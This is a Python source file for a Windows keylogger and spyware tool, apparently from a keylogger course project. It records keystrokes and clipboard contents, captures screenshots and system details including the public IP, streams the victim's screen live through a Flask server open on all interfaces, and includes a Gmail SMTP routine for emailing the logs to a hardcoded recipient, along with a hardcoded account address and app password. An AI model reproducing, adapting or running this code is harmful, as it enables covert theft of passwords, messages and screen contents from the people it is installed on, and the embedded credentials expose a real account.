from flask import Flask, Response
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import smtplib
import socket
import platform
import win32clipboard
from pynput.keyboard import Key, Listener
import pyautogui
import io
import time
import os
from PIL import ImageGrab
from threading import Thread
from requests import get
import signal
import sys

app = Flask(__name__)

# Email and file setup
email_address = "rajeshkumar07dhoni@gmail.com"
app_password = "jybs ihvk vaeu fklv"
toaddr = "r54057507@gmail.com"

file_path = "F:\\python-advanced-keylogger-crash-course-master"
if not os.path.exists(file_path):
    os.makedirs(file_path)

keys_information = "key_log.txt"
system_information = "systeminfo.txt"
clipboard_information = "clipboard.txt"
screenshot_information = "screenshot.png"

file_merge = os.path.join(file_path, "")

# Email sending function
def send_email(filename, attachment, toaddr):
    fromaddr = email_address
    msg = MIMEMultipart()
    msg['From'] = fromaddr
    msg['To'] = toaddr
    msg['Subject'] = "Log File"
    body = "Here is the log file."
    msg.attach(MIMEText(body, 'plain'))

    try:
        with open(attachment, 'rb') as f:
            p = MIMEBase('application', 'octet-stream')
            p.set_payload(f.read())
            encoders.encode_base64(p)
            p.add_header('Content-Disposition', f"attachment; filename={filename}")
            msg.attach(p)
    except Exception as e:
        print(f"Failed to attach file {filename}: {e}")
        return

    try:
        s = smtplib.SMTP('smtp.gmail.com', 587)
        s.starttls()
        s.login(fromaddr, app_password)
        s.sendmail(fromaddr, toaddr, msg.as_string())
        s.quit()
        print(f"Email sent successfully with {filename}")
    except Exception as e:
        print(f"Failed to send email: {e}")


# Gather system information
def computer_information():
    with open(file_merge + system_information, "a") as f:
        hostname = socket.gethostname()
        IPAddr = socket.gethostbyname(hostname)
        try:
            public_ip = get("https://api.ipify.org").text
            f.write("Public IP Address: " + public_ip + '\n')
        except Exception:
            f.write("Couldn't get Public IP Address (most likely max query)")

        f.write("Processor: " + platform.processor() + '\n')
        f.write("System: " + platform.system() + " " + platform.version() + '\n')
        f.write("Machine: " + platform.machine() + "\n")
        f.write("Hostname: " + hostname + "\n")
        f.write("Private IP Address: " + IPAddr + "\n")


# Capture clipboard content
def copy_clipboard():
    with open(file_merge + clipboard_information, "a") as f:
        try:
            win32clipboard.OpenClipboard()
            pasted_data = win32clipboard.GetClipboardData()
            win32clipboard.CloseClipboard()
            f.write("Clipboard Data: \n" + pasted_data)
        except:
            f.write("Clipboard could not be copied\n")


# Capture screenshots
def screenshot():
    try:
        im = ImageGrab.grab()
        im.save(file_merge + screenshot_information)
    except Exception as e:
        print(f"Failed to take screenshot: {e}")


# Keylogger setup
# keys = []

# def on_press(key):
#     global keys
#     k = str(key).replace("'", "")
#     keys.append('\n' if k.find("space") > 0 else k)
#     write_file()


# def write_file():
#     with open(file_merge + keys_information, "a") as f:
#         for key in keys:
#             f.write(key)
#         f.flush()
#     keys.clear()

keys = []
pressed_keys = set()
last_key_combo = None  # To track the last key combination and avoid repeated "Ctrl+C"

def on_press(key):
    global keys, last_key_combo

    k = str(key).replace("'", "")
    
    # Special handling for Ctrl+C
    if Key.ctrl_l in pressed_keys and k == 'c':
        current_combo = "Ctrl+C"
        if last_key_combo != current_combo:  # Only log once if it's the first detection
            keys.append("Ctrl+C\n")
            last_key_combo = current_combo
    else:
        # If the key is not "Ctrl+C", just log it as usual
        if k == "Key.space":
            keys.append(' ')  # Add space character for readability
        elif "Key" not in k:  # Ignore special keys unless it's "Ctrl+C"
            keys.append(k)

        # Reset last_key_combo if a different key is pressed
        last_key_combo = None

    # Immediately write keys to file
    write_file()

def on_release(key):
    # Stop the listener if "Ctrl+C" is pressed, logging it once
    if Key.ctrl_l in pressed_keys and key == 'c':
        return False

def write_file():
    with open("key_log.txt", "a") as f:
        for key in keys:
            f.write(key)
        f.flush()  # Ensure the keys are written immediately to file
    keys.clear()  # Clear keys after writing to file


def start_keylogger():
    with Listener(on_press=on_press) as listener:
        listener.join()


# Stream screenshots function
def capture_screen():
    while True:
        screenshot = pyautogui.screenshot()
        img_io = io.BytesIO()
        screenshot.save(img_io, 'JPEG')
        img_io.seek(0)
        yield (b'--frame\r\n'
               b'Content-Type: image/jpeg\r\n\r\n' + img_io.read() + b'\r\n\r\n')
        time.sleep(0.1)


@app.route('/stream')
def stream():
    return Response(capture_screen(), mimetype='multipart/x-mixed-replace; boundary=frame')


# Handle graceful shutdown and send logs on shutdown
def shutdown_server():
    print("Shutting down server and sending logs...")
    # send_email(keys_information, file_merge + keys_information, toaddr)
    # send_email(screenshot_information, file_merge + screenshot_information, toaddr)
    # #send_email(clipboard_information, file_merge + clipboard_information, toaddr)
    # send_email(system_information, file_merge + system_information, toaddr)
    sys.exit(0)


# Signal handler for CTRL+C
def signal_handler(sig, frame):
    shutdown_server()


# Register the signal handler for SIGINT (CTRL+C)
signal.signal(signal.SIGINT, signal_handler)


if __name__ == "__main__":
    # Collect system and clipboard info before starting the keylogger and streaming
    computer_information()
    copy_clipboard()
    screenshot()

    # Start keylogger in a daemon thread so it stops with main process
    keylogger_thread = Thread(target=start_keylogger, daemon=True)
    keylogger_thread.start()

    # Run Flask app (blocking call, server will stop on CTRL+C)
    app.run(host='0.0.0.0', port=5000)
